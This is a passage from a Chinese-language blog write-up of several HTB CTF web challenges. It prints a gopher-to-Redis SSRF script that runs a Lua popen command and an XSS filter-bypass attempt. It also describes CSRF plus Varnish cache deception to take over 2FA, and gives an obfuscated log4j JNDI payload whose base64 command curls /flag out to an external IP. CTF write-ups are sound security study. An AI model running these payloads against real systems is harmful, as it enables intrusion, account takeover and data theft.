<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line">shell = <span class="string">&quot;&quot;&quot;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;cat /root/flag &gt; /app/static/rce.txt&quot;, &quot;w&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&quot;&quot;&quot;</span></span><br><span class="line">filename = <span class="string">&quot;test.txt&quot;</span></span><br><span class="line">path = <span class="string">&quot;/app/static&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">cmd = [</span><br><span class="line">    <span class="string">&quot;auth r4yh4nb34t5B1gM4c&quot;</span>,</span><br><span class="line">	<span class="string">&quot;eval &#123;&#125; 0&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">	cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd += CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">	print(payload)</span><br><span class="line">	<span class="comment">#print(urllib.parse.quote(payload))  urlencode</span></span><br></pre></td></tr></table></figure>

<p>FLAG：HTB{r3d_righ7_h4nd_t0_th3_r3dis_land!}</p>
<h1 id="Genesis-Wallet"><a href="#Genesis-Wallet" class="headerlink" title="Genesis Wallet"></a>Genesis Wallet</h1><p>登录需要使用OTP验证，使用在线</p>
<p> <a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai">https://chrome.google.com/webstore/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai</a> </p>
<p>扫描非常方便，这题非预期，注册两个号，转负数即可</p>
<p>FLAG：HTB{fl3w_t00_cl0s3_t0_th3_d3cept10n}</p>
<h1 id="Genesis-Wallet’s-Revenge"><a href="#Genesis-Wallet’s-Revenge" class="headerlink" title="Genesis Wallet’s Revenge"></a>Genesis Wallet’s Revenge</h1><p>修复了负数，来正式的看一下这个题</p>
<p>/routes/index.js</p>
<p>注册登录用户就不说了，登录时要求OTP，来个正面图</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518212731980.png" alt="image-20220518212731980"></p>
<p>模拟转账功能，send存在一个note，这里可能存在xss</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518212824308.png" alt="image-20220518212824308"></p>
<p>来看一下flag的获得条件：用户余额大于1337，而且用户还不能是 icarus，这个就是类似管理员，他的信息存在database.js中</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518212308920.png" alt="image-20220518212308920"></p>
<p>这个OTP给我留下过挺深印象的：NahamCon CTF 2022 的 Two For One，几乎是一摸一样</p>
<p>抓包看看转账时，存在一个过滤</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518214521458.png" alt="image-20220518214521458"></p>
<p>看一下过滤的功能，使用了 DOMPurify 进行过滤</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518235849023.png" alt="image-20220518235849023"></p>
<p>我的思路是通过bypass 这个 xss filter，给 icarus 转账，造成CSRF给我转账，或者更改信息等操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;&lt;em id&#x3D;&quot;aaa&#96;bbb&quot;&gt;</span><br><span class="line">-&gt;&lt;em id&#x3D;&quot;aaabbb&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;strong&gt;I am trying to be &lt;s&gt;malicious&lt;&#x2F;s&gt; &lt;u&gt;here&lt;&#x2F;u&gt;! &lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&lt;&#x2F;strong&gt;</span><br><span class="line">-&gt; &lt;strong&gt;I am trying to be &lt;s&gt;malicious&lt;&#x2F;s&gt; here! &lt;img src&#x3D;&quot;1&quot;&gt;&lt;&#x2F;strong&gt;</span><br><span class="line"></span><br><span class="line">&lt;strong&gt;&lt;&#x2F;p&gt;&lt;a id&#x3D;&quot;&lt;&#x2F;style&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&quot;&gt;</span><br><span class="line">-&gt;&lt;strong&gt;&lt;&#x2F;strong&gt;&lt;strong&gt;&lt;a id&#x3D;&quot;&lt;&#x2F;style&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;</span><br><span class="line"></span><br><span class="line">&lt;strong&gt;&lt;&#x2F;p&gt;&lt;a id&#x3D;&quot;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&quot;&gt;</span><br><span class="line">-&gt;&lt;strong&gt;&lt;&#x2F;strong&gt;&lt;strong&gt;&lt;a id&#x3D;&quot;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;</span><br><span class="line"></span><br><span class="line">![](http:&#x2F;&#x2F;test)</span><br><span class="line">-&gt;&lt;img alt&#x3D;&quot;&quot; src&#x3D;&quot;http:&#x2F;&#x2F;test&quot;&gt;</span><br><span class="line"></span><br><span class="line">[&lt;a&gt;&lt;img src&#x3D;\\ onload&#x3D;1&gt;\&quot;onerror&#x3D;alert(1)&gt;&lt;&#x2F;a&gt;](http:&#x2F;&#x2F;test)</span><br><span class="line">&#x3D;&gt; &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;test&quot;&gt;&lt;&#x2F;a&gt;&lt;a&gt;&lt;img src&#x3D;&quot;\&quot;&gt;&quot;onerror&#x3D;alert(1)&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>一些文章</p>
<p><a target="_blank" rel="noopener" href="https://jorianwoltjer.com/blog/post/ctf/nahamcon-ctf-2022/two-for-one">https://jorianwoltjer.com/blog/post/ctf/nahamcon-ctf-2022/two-for-one</a></p>
<p><a target="_blank" rel="noopener" href="https://infosecwriteups.com/clique-writeup-%C3%A5ngstromctf-2022-e7ae871eaa0e">https://infosecwriteups.com/clique-writeup-%C3%A5ngstromctf-2022-e7ae871eaa0e</a></p>
<p>xss的过滤器实在是绕不过去，重新看一下附件，发现使用了varnishi作为缓存</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220519151241215.png" alt="image-20220519151241215"></p>
<p>立马思路转变，可以尝试web 缓存投毒就不用费力气去bypass filter，很可惜关于这方面知识欠缺，最终放弃这道题目</p>
<p><strong>复现</strong></p>
<p>起docker实在是太慢了，只能本地起一个没有varnish的环境，找到一篇wp看看算了</p>
<p><a target="_blank" rel="noopener" href="https://h1pmnh.github.io/post/ctf-htb-cyber-apolcalypse-web-genesis-wallet/">https://h1pmnh.github.io/post/ctf-htb-cyber-apolcalypse-web-genesis-wallet/</a></p>
<p>发现这个路由下存在一些问题，只要用户访问这个路由，不管用户有没有扫码验证，都会产生新的OTP然后将新的OTP放到数据库中，也就是说这里如果用户没有保存二维码，用户将直接被拒之门外</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/dasctf-may/image-20220521232612907.png" alt="image-20220521232612907"></p>
<p>测试账号访问 /reset-2fa，html中会有这样产生新的认证，生成二维码，如果我们可以获取到bot的这个东西，就相当于有了他的二维码，也就账号接管了，所以现在就是两个方面：1. CSRF 2. 获取bot的html页面</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/dasctf-may/image-20220521233516974.png" alt="image-20220521233516974"></p>
<p>也就是说我们要构造的CSRF为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;&#x2F;reset-2fa&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>那么基于markdown格式就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![](&#x2F;reset-2fa)</span><br></pre></td></tr></table></figure>

<p>至于bot的html页面，利用Varnish进行web 缓存欺骗</p>
<p>查看Varnish配置文件，</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/dasctf-may/image-20220521234157498.png" alt="image-20220521234157498"></p>
<p>构造 <strong>/reset-2fa?ctf.jpg</strong> 将会被缓存，另外，由于varnish保证host头唯一，bot从127.0.0.1访问，payload也需要修改Host头</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sub vcl_hash &#123;</span><br><span class="line">    hash_data(req.url);</span><br><span class="line"></span><br><span class="line">    if (req.http.host) &#123;</span><br><span class="line">        hash_data(req.http.host);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        hash_data(server.ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return (lookup);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发送markdown：![](&#x2F;reset-2fa?123.jpg)</span><br><span class="line">访问缓存页面,根据缓存页面生成二维码,伪造登录</span><br></pre></td></tr></table></figure>



<h1 id="CheckpointBots"><a href="#CheckpointBots" class="headerlink" title="CheckpointBots"></a>CheckpointBots</h1><p>JAVA题 :)</p>
<p>package中有log4j</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220519101714827.png" alt="image-20220519101714827"></p>
<p>这里直接token可控，拼接到log中，然后token弄成payload就行了</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220520005254332.png" alt="image-20220520005254332"></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;:&#x2F;&#x2F;150.158.181.145:1389&#x2F;TomcatBypass&#x2F;Command&#x2F;Base64&#x2F;Y3VybCBodHRwOi8vMS4xMTYuMTEwLjYxOjQwMDAgLUYgZmlsZT1AL2ZsYWc%253D&#125;       </span><br></pre></td></tr></table></figure>

<p>FLAG：HTB{l0g4j2_g4dg3t_ch4in_55t1_f0r_fun}</p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/12/25/java-dll/" rel="prev" title="初探java加载动态链接库">
                  <i class="fa fa-angle-left"></i> 初探java加载动态链接库
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/12/25/Fastjson(%E4%BA%8C)/" rel="next" title="Fastjson 1.2.25-1.2.47">
                  Fastjson 1.2.25-1.2.47 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Y0ng</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  





</body>
</html>
